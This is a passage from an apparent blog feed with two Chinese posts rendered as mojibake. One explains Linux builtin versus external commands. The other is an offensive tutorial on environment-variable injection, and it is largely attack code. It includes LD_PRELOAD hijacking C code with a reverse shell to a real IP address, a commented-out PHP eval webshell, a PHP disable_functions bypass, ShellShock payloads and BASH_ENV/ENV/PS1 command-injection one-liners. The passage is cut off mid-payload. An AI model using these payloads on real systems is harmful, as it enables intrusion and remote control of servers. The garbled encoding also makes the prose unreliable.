        <content type="html"><![CDATA[<h2 id="å‘½ä»¤æœ¬è´¨"><a href="#å‘½ä»¤æœ¬è´¨" class="headerlink" title="å‘½ä»¤æœ¬è´¨"></a>å‘½ä»¤æœ¬è´¨</h2><p>å‘½ä»¤å®é™…ä¸Šå°±æ˜¯å…·æœ‰ä¸€å®šåŠŸèƒ½çš„äºŒè¿›åˆ¶æ–‡ä»¶</p><h2 id="å‘½ä»¤ä½ç½®"><a href="#å‘½ä»¤ä½ç½®" class="headerlink" title="å‘½ä»¤ä½ç½®"></a>å‘½ä»¤ä½ç½®</h2><p>&#x2F;bin,&#x2F;usr&#x2F;binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨</p><p>&#x2F;sbin,&#x2F;usr&#x2F;sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</p><h2 id="æ‰§è¡Œè¿‡ç¨‹"><a href="#æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="æ‰§è¡Œè¿‡ç¨‹"></a>æ‰§è¡Œè¿‡ç¨‹</h2><p><img src="/../images/4dbf34717d434bb692683937feb52fea.png" alt="img"></p><h2 id="å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º"><a href="#å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º" class="headerlink" title="å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º"></a>å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º</h2><blockquote><p>å†…å»ºå‘½ä»¤å®é™…ä¸Šæ˜¯shellç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œç®€å•å¿«é€Ÿç³»ç»Ÿbashå†…ç½®æºç <br>æ¯”å¦‚ï¼šexitï¼Œhistoryï¼Œcdï¼Œechoç­‰ã€‚</p><p>å¤–éƒ¨å‘½ä»¤æ˜¯linuxç³»ç»Ÿä¸­çš„å®ç”¨ç¨‹åºéƒ¨åˆ†ï¼Œå¤–éƒ¨å‘½ä»¤çš„å®ä½“å¹¶ä¸åŒ…å«åœ¨shellä¸­ï¼Œä½†æ˜¯å…¶å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹æ˜¯ç”±shellç¨‹åºæ§åˆ¶çš„ã€‚å¤–éƒ¨å‘½ä»¤æ˜¯åœ¨bashä¹‹å¤–é¢å¤–å®‰è£…çš„ï¼Œé€šå¸¸æ”¾åœ¨&#x2F;binï¼Œ&#x2F;usr&#x2F;binï¼Œ&#x2F;sbinï¼Œ&#x2F;usr&#x2F;sbinç­‰</p></blockquote><ul><li><p>æŸ¥çœ‹å¤–éƒ¨å‘½ä»¤å­˜å‚¨ä½ç½®</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220710194138135-1686283886642.png" alt="image-20220710194138135"></p><p>æ³¨ï¼šè¿™é‡Œçš„PATHå°±æ˜¯ç»å¸¸æåˆ°çš„ç¯å¢ƒå˜é‡</p><blockquote><p>å½“ç”¨æˆ·æ‰§è¡Œçš„æ˜¯å¤–éƒ¨å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨æŒ‡å®šçš„å¤šä¸ªè·¯å¾„ä¸­æŸ¥æ‰¾commandçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œå®šä¹‰è¿™äº›è·¯å¾„çš„å˜é‡ï¼Œå°±ç§°ä¸º PATH ç¯å¢ƒå˜é‡ï¼Œå…¶ä½œç”¨å°±æ˜¯å‘Šè¯‰ Shell å¾…æ‰§è¡Œå‘½ä»¤çš„å¯æ‰§è¡Œæ–‡ä»¶å¯èƒ½å­˜æ”¾çš„ä½ç½®ï¼ŒShell ä¼šåœ¨ PATH å˜é‡åŒ…å«çš„å¤šä¸ªè·¯å¾„ä¸­é€ä¸ªæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ï¼ˆå¦‚æœæ‰¾ä¸åˆ°ï¼ŒShell ä¼šæä¾›ç”¨æˆ·â€œæ‰¾ä¸åˆ°æ­¤å‘½ä»¤â€ï¼‰ã€‚</p></blockquote></li><li><p>åˆ¤æ–­å‘½ä»¤æ˜¯å¦ä¸ºå¤–éƒ¨è¿˜æ˜¯å†…å»ºå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="built_in">command</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type vim</span><br><span class="line">vim is /usr/bin/vim</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type ps</span><br><span class="line">ps is hashed (/usr/bin/ps)</span><br></pre></td></tr></table></figure></li><li><p>åŒºåˆ«</p><ul><li><p>å¤–éƒ¨å‘½ä»¤</p><blockquote><p>å½“å¤–éƒ¨å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œä¼šåˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹ã€‚è¿™ç§æ“ä½œè¢«ç§°ä¸ºè¡ç”Ÿï¼ˆforkingï¼‰ã€‚å¤–éƒ¨å‘½ä»¤pså¾ˆæ–¹ä¾¿æ˜¾ç¤ºå‡ºå®ƒçš„çˆ¶è¿›ç¨‹ä»¥åŠè‡ªå·±æ‰€å¯¹åº”çš„è¡ç”Ÿå­è¿›ç¨‹ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root      8986  8984  0 17:17 pts/0    00:00:00 -bash</span><br><span class="line">root      9054  8986  0 17:53 pts/0    00:00:00 ps -f</span><br></pre></td></tr></table></figure><p>psè¿›ç¨‹çš„PPIDä¸º-bashçš„PIDã€‚</p><p><img src="/../images/image-20220923175907599.png" alt="image-20220710194138135"></p></li><li><p>å†…å»ºå‘½ä»¤</p><blockquote><p>å†…å»ºå‘½ä»¤å’Œå¤–éƒ¨å‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰è€…ä¸éœ€è¦ä½¿ç”¨å­è¿›ç¨‹æ¥æ‰§è¡Œã€‚</p><p>å› ä¸ºæ—¢ä¸éœ€è¦é€šè¿‡è¡ç”Ÿå‡ºå­è¿›ç¨‹æ¥æ‰§è¡Œï¼Œä¹Ÿä¸éœ€è¦æ‰“å¼€ç¨‹åºæ–‡ä»¶ï¼Œå†…å»ºå‘½ä»¤çš„æ‰§è¡Œé€Ÿåº¦è¦æ›´</p><p>å¿«ï¼Œæ•ˆç‡ä¹Ÿæ›´é«˜ã€‚</p></blockquote></li></ul></li><li><p>æœ‰äº›å‘½ä»¤æœ‰å¤šç§å®ç°æ–¹å¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type -a cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">cd is /usr/bin/cd</span><br></pre></td></tr></table></figure><blockquote><p>å¯¹äºæœ‰å¤šç§å®ç°çš„å‘½ä»¤ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨å…¶å¤–éƒ¨å‘½ä»¤å®ç°ï¼Œç›´æ¥æŒ‡æ˜å¯¹åº”çš„æ–‡ä»¶å°±å¯ä»¥äº†ã€‚</p><p>ä¾‹å¦‚ï¼Œè¦ä½¿ç”¨å¤–éƒ¨å‘½ä»¤pwdï¼Œå¯ä»¥è¾“å…¥&#x2F;bin&#x2F;pwdã€‚</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¯å¢ƒå˜é‡æ³¨å…¥</title>
      <link href="/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><blockquote><p>LD_PRELOAD æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚</p></blockquote><p>å…·ä½“çš„æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å®šä¹‰ä¸ç›®æ ‡å‡½æ•°å®Œå…¨ä¸€æ ·çš„å‡½æ•°ï¼ŒåŒ…æ‹¬åç§°ã€å˜é‡åŠç±»å‹ã€è¿”å›å€¼åŠç±»å‹ç­‰ã€‚</li><li>å°†åŒ…å«æ›¿æ¢å‡½æ•°çš„æºç ç¼–è¯‘ä¸ºåŠ¨æ€é“¾æ¥åº“ã€‚</li><li>é€šè¿‡å‘½ä»¤ <code>export LD_PRELOAD=&quot;åº“æ–‡ä»¶è·¯å¾„&quot;</code>ï¼Œè®¾ç½®è¦ä¼˜å…ˆæ›¿æ¢åŠ¨æ€é“¾æ¥åº“å³å¯ã€‚</li><li>æ›¿æ¢ç»“æŸï¼Œè¦è¿˜åŸå‡½æ•°è°ƒç”¨å…³ç³»ï¼Œç”¨å‘½ä»¤<code>unset LD_PRELOAD</code> è§£é™¤</li></ol><h1 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h1><h2 id="åŠ«æŒlså‘½ä»¤"><a href="#åŠ«æŒlså‘½ä»¤" class="headerlink" title="åŠ«æŒlså‘½ä»¤"></a>åŠ«æŒlså‘½ä»¤</h2><p>æŸ¥æ‰¾lså‘½ä»¤æ‰§è¡Œæ—¶è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ï¼Œä¾‹å¦‚è°ƒç”¨äº†<code>strncmp</code></p><p>payload</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *__s1, <span class="type">const</span> <span class="type">char</span> *__s2, <span class="type">size_t</span> __n)</span> &#123;    </span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‡½æ•°çš„å®šä¹‰å¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œç¡®å®š</p><img src="E:\typora img\QQæˆªå›¾20221107134218.jpg" alt="QQæˆªå›¾20221107134218" style="zoom:67%;" /><p>ä»æºç ä¸­æ‰¾åˆ°çš„</p><img src="E:\typora img\QQæˆªå›¾20221107134226.jpg" alt="QQæˆªå›¾20221107134226" style="zoom: 67%;" /><p>ç¼–è¯‘å½¢æˆ.soæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒå˜é‡è®¾ç½®ä¼˜å…ˆçº§</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=$PWD/hook_strncmp.so</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ç»“æœ</p><p><img src="/../images/image-20221107135601599-1686813288526.png" alt="image-20221107135601599"></p><h2 id="æ›´ä¸ºç®€å•çš„åŠ«æŒ"><a href="#æ›´ä¸ºç®€å•çš„åŠ«æŒ" class="headerlink" title="æ›´ä¸ºç®€å•çš„åŠ«æŒ"></a>æ›´ä¸ºç®€å•çš„åŠ«æŒ</h2><p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <strong>attribute</strong>((constructor))ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œé‚£ä¹ˆ<strong>ä¸€æ—¦åŠ¨æ€é“¾æ¥åº“è¢«ç³»ç»ŸåŠ è½½ï¼Œå°†ç«‹å³æ‰§è¡Œ _attribute((constructor)) ä¿®é¥°çš„å‡½æ•°</strong>ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¸ç”¨å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘åŠ«æŒåŠ¨æ€é“¾æ¥åº“äº†ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯åŠ«æŒäº†ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚</p><ul><li><p>hook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;echo \&quot;&lt;?php eval(\\$_POST[cmd]);?&gt;\&quot; &gt; /var/www/html/shell.php&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘å½¢æˆ.soæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook.c -o hook.so</span><br></pre></td></tr></table></figure></li></ul><h2 id="PHPä¸­"><a href="#PHPä¸­" class="headerlink" title="PHPä¸­"></a>PHPä¸­</h2><ul><li>RCE</li><li>ç»•è¿‡disable_function</li></ul><h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><ul><li>èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œåªè¦æ˜¯.soæ–‡ä»¶ï¼Œä»»æ„åç¼€åéƒ½å¯ä»¥è§£æ</li><li>èƒ½å¤Ÿè®¾ç½®ç¯å¢ƒå˜é‡<code>LD_PRELOAD</code></li><li>æœ‰å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•°ï¼ˆè¿™æ ·æ‰èƒ½å¤ŸåŠ«æŒï¼‰</li></ul><h3 id="å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„-PHP-å‡½æ•°"><a href="#å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„-PHP-å‡½æ•°" class="headerlink" title="å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•°"></a>å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•°</h3><p>æŸ¥çœ‹PHPå‡½æ•°è°ƒç”¨æ—¶çš„shellæ“ä½œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strace -f php test.php <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -A2 -B2 execve</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>s</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221108113210633-1686813288527.png" alt="image-20221108113210633"></p><p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œmailå‡½æ•°æ—¶å®é™…æ˜¯å¯åŠ¨äº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤<code>sendmail</code></p><p>å…¶ä»–å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„phpå‡½æ•°</p><ul><li><code>error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</code></li><li><code>$img = new Imagick(&#39;/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv&#39;);</code></li><li><code>system</code></li><li><code>imap_mail()</code></li><li><code>mb_send_mail()</code></li></ul><h3 id="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡disable-function"><a href="#æ–‡ä»¶ä¸Šä¼ ç»•è¿‡disable-function" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡disable_function"></a>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡<code>disable_function</code></h3><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><h3 id="æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰"><a href="#æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰" class="headerlink" title="æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰"></a>æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰</h3><p>ä»¥ä¸‹æµ‹è¯•ç¯å¢ƒ</p><p><img src="/../images/image-20221126164918984-1686813288527.png" alt="image-20221126164918984"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... ä¸€äº›å…¶ä»–ä»£ç </span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>); <span class="comment"># ç›¸å½“äºsh -c echo &quot;command&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>åªé€‚ç”¨äºredhatç³»åˆ—â€“centos</p><blockquote><p>redhatç³»åˆ—shæŒ‡å‘bash</p><p><img src="/../images/image-20221126161815577-1686813288527.png" alt="image-20221126161815577"></p></blockquote><blockquote><p>debianç³»åˆ—æŒ‡å‘dash</p><p><img src="/../images/image-20221126163241501-1686813288527.png" alt="image-20221126163241501"></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Bashæ²¡æœ‰ä¿®å¤ShellShockæ¼æ´ï¼šç›´æ¥ä½¿ç”¨ShellShockçš„POCè¿›è¡Œæµ‹è¯•ï¼Œä¾‹å¦‚TEST=&#x27;() &#123; :; &#125;&#x27;; id;</span><br><span class="line"></span><br><span class="line">Bash 4.4ä»¥å‰ï¼šenv $&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27; bash -c &quot;echo hello&quot;</span><br><span class="line"></span><br><span class="line">Bash 4.4åŠä»¥ä¸Šï¼šenv $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&#x27;echo hello&#x27;); # ç›¸å½“äºsh -c echo &quot;command&quot;</span></span><br><span class="line">?envs[<span class="title function_ invoke__">BASH_FUNC_echo</span>()]=() &#123; ls; &#125;</span><br></pre></td></tr></table></figure><img src="E:\typora img\image-20221126170554976.png" alt="image-20221126170554976" style="zoom:50%;" /><h4 id="å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload"><a href="#å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload" class="headerlink" title="å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload"></a>å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload</h4><h5 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h5><ul><li><p><code>PROMPT_COMMAND</code>ï¼šå¯ä»¥åœ¨<code>bash</code>äº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=&#x27;id&#x27; bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162222851-1686813288528.png" alt="image-20221126162222851"></p></li></ul><h5 id="é€šç”¨"><a href="#é€šç”¨" class="headerlink" title="é€šç”¨"></a>é€šç”¨</h5><ul><li><code>ENV</code>ï¼šå¯ä»¥åœ¨<code>sh -i -c</code>çš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; sh -i -c &quot;echo hello&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162443791-1686813288528.png" alt="image-20221126162443791"></p><p><img src="/../images/image-20221126162453087-1686813288528.png" alt="image-20221126162453087"></p><ul><li><p><code>BASH_ENV</code>ï¼šå¯ä»¥åœ¨<code>bash -c</code>çš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BASH_ENV=&#x27;$(id 1&gt;&amp;2)&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162613165-1686813288528.png" alt="image-20221126162613165"></p></li></ul><p><img src="/../images/image-20221126162622468-1686813288528.png" alt="image-20221126162622468"></p><ul><li><p><code>PS1</code>ï¼šå¯ä»¥åœ¨<code>dash</code>æˆ–<code>bash</code>äº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS1=&#x27;$(whoami)&#x27; dash/bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126163037850-1686813288528.png" alt="image-20221126163037850"></p></li></ul><p><img src="/../images/image-20221126163059160-1686813288528.png" alt="image-20221126163059160"></p><h4 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;command&#x27;</span>) ----&gt;  <span class="title function_ invoke__">php_exec_ex</span>() ----&gt;   <span class="title function_ invoke__">php_exec</span>()  ---&gt;   linux popenå‡½æ•°  ---&gt;</span><br><span class="line">Linux glibcåº“    ----&gt;   sh -c <span class="keyword">echo</span> <span class="string">&quot;command&quot;</span>  </span><br></pre></td></tr></table></figure><blockquote><p>glibcæ˜¯gnuå‘å¸ƒçš„libcåº“ï¼Œä¹Ÿå³cè¿è¡Œåº“ã€‚glibcæ˜¯linux ç³»ç»Ÿä¸­æœ€åº•å±‚çš„apiï¼ˆåº”ç”¨ç¨‹åºå¼€å‘æ¥å£ï¼‰ï¼Œå‡ ä¹å…¶å®ƒä»»ä½•çš„è¿è¡Œåº“éƒ½ä¼šå€šèµ–äºglibcã€‚</p></blockquote><img src="E:\typora img\image-20221107153339706.png" alt="image-20221107153339706" style="zoom:67%;" /><img src="E:\typora img\image-20221107153422836.png" alt="image-20221107153422836" style="zoom:67%;" /><img src="E:\typora img\image-20221107153502513.png" alt="image-20221107153502513" style="zoom:67%;" /><img src="E:\typora img\image-20221107153708100.png" alt="image-20221107153708100" style="zoom:67%;" /><h5 id="debianç³»åˆ—"><a href="#debianç³»åˆ—" class="headerlink" title="debianç³»åˆ—"></a>debianç³»åˆ—</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c echo &quot;command&quot;  --&gt; dash -c echo &quot;command&quot;   #  åœ¨debianç³»åˆ—shæŒ‡å‘dash</span><br></pre></td></tr></table></figure><p>æ¼æ´äº§ç”ŸåŸå› </p><p>åœ¨dashæºç ä¸­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> linux</span></span><br><span class="line">getuid( ) == geteuid( ) &amp;&amp; getgid( ) == getegid( ) S &amp;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">iflag ï¼‰&#123;  <span class="comment">// iflagä¸º-iå‚æ•°ï¼Œæ‰€ä»¥åªæœ‰ä¼ å…¥-iå‚æ•°æ‰èƒ½è¿›å…¥ä¸‹é¢çš„ifè¯­å¥</span></span><br><span class="line"><span class="keyword">if</span> ((shinit = lookupvar(<span class="string">&quot;ENV&quot;</span>)) != <span class="literal">NULL</span> &amp;&amp; *shinit != <span class="string">&#x27;\0&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">    read_profile(shinit);</span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_profile</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STATIC <span class="type">void</span></span><br><span class="line"><span class="title function_">read_profile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// expandstrå¯ä»¥è§£æshellå‘½ä»¤ï¼Œè§£æçš„nameå‚æ•°å°±æ˜¯ç¯å¢ƒå˜é‡ENV</span></span><br><span class="line">    name = expandstr(name);</span><br><span class="line">    <span class="keyword">if</span> (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    cmdloop(<span class="number">0</span>);</span><br><span class="line">    popfile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; dash -i -c &#x27;echo 